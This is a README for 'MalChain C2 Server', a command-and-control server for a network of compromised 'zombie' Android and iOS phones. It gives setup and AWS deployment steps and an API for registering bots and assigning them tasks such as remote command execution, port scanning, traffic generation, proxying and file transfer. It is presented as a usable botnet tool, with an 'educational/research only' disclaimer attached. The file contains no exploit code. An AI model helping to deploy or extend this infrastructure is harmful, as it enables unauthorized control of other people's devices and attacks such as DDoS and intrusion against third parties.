# MalChain C2 Server

Command & Control server for managing zombie phone infrastructure (Android + iOS).

## Features

- **Multi-platform support**: Android and iOS devices
- **Real-time communication**: WebSocket support for live updates
- **Task management**: Distributed task queue and assignment
- **Device authentication**: Secure API key-based authentication
- **RESTful API**: Complete API for device and task management
- **Scalable architecture**: PostgreSQL + Redis backend

## Quick Start

### Using Docker (Recommended)

```bash
# Start all services
docker-compose up -d

# Check logs
docker-compose logs -f c2-server

# Stop services
docker-compose down
```

The C2 server will be available at `http://localhost:8000`

### Manual Setup

```bash
# Install dependencies
pip install -r requirements.txt

# Set up environment variables
cp .env.example .env
# Edit .env with your settings

# Start PostgreSQL and Redis
# (You need to have these running)

# Run the server
python main.py
```

## API Endpoints

### Node Management

- `POST /api/nodes/register` - Register new device
- `POST /api/nodes/heartbeat` - Update heartbeat (requires auth)
- `GET /api/nodes/` - List all nodes
- `GET /api/nodes/{node_id}` - Get specific node

### Task Management

- `POST /api/tasks/` - Create new task
- `GET /api/tasks/` - List all tasks
- `GET /api/tasks/pending` - Get pending tasks (requires auth)
- `PATCH /api/tasks/{task_id}` - Update task status (requires auth)
- `POST /api/tasks/{task_id}/assign/{node_id}` - Assign task to node

### WebSocket

- `WS /ws/{node_id}?api_key={api_key}` - Real-time communication

## Authentication

Devices authenticate using:
- `X-Node-ID` header: Device unique ID
- `X-API-Key` header: API key received during registration

## Task Types

- `port_scan` - Network port scanning
- `proxy_request` - Proxy HTTP requests
- `traffic_gen` - Generate network traffic
- `execute_command` - Execute custom commands
- `file_upload` - Upload files
- `file_download` - Download files
- `custom` - Custom task type

## Architecture

```
┌─────────────┐
│   Clients   │ (Android/iOS Apps)
└──────┬──────┘
       │
       ├─── HTTP/REST ───┐
       └─── WebSocket ───┤
                         │
                    ┌────▼─────┐
                    │   C2     │
                    │  Server  │
                    └────┬─────┘
                         │
          ┌──────────────┼──────────────┐
          │              │              │
     ┌────▼────┐    ┌────▼────┐   ┌────▼────┐
     │PostgreSQL│    │  Redis  │   │  Tasks  │
     └─────────┘    └─────────┘   └─────────┘
```

## Security Notes

**EDUCATIONAL/RESEARCH PURPOSE ONLY**

- Change default SECRET_KEY and API_KEY_SALT in production
- Use HTTPS in production environments
- Implement rate limiting for production
- Only use on devices you own
- Follow local laws and regulations
- Do not use for unauthorized access

## AWS Deployment

To deploy on AWS EC2:

1. Launch EC2 instance (Ubuntu 22.04 recommended)
2. Install Docker and Docker Compose
3. Clone this repository
4. Configure security groups (ports 8000, 5432, 6379)
5. Run `docker-compose up -d`

For AWS-managed services:
- Use RDS for PostgreSQL
- Use ElastiCache for Redis
- Update DATABASE_URL and REDIS_URL in .env

## License

Educational/Research purposes only. Use responsibly.
